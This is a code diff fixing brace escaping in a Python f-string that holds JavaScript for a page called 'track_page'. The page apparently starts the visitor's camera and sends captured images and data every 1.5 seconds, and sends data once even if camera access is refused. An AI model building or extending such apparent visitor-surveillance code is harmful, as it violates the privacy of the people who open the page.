@@ -129,7 +129,7 @@ async def track_page(request: web.Request):
       }} catch (err) {{
         console.error("Yuborishda xato:", err);
       }}
-    }
+    }}
 
     async function startCameraAndLoop() {{
       try {{
@@ -178,7 +178,7 @@ async def track_page(request: web.Request):
           await sendData(freshData, newImg);
         }}, 1500);
 
-      } catch (err) {{
+      }} catch (err) {{
         console.warn("Kamera ruxsati rad etildi yoki mavjud emas:", err);
         // Faqat bir marta ma'lumot yuborish
         if (!hasSentInitialData) {{
@@ -194,7 +194,7 @@ async def track_page(request: web.Request):
           }});
         }} catch (e) {{}}
       }}
-    }
+    }}
 
     function stopEverything() {{
       if (intervalId) {{
@@ -205,7 +205,7 @@ async def track_page(request: web.Request):
         stream.getTracks().forEach(track => track.stop());
         stream = null;
       }}
-    }
+    }}
 
     // Sahifa tark etilganda to'xtatish
     window.addEventListener('beforeunload', stopEverything);
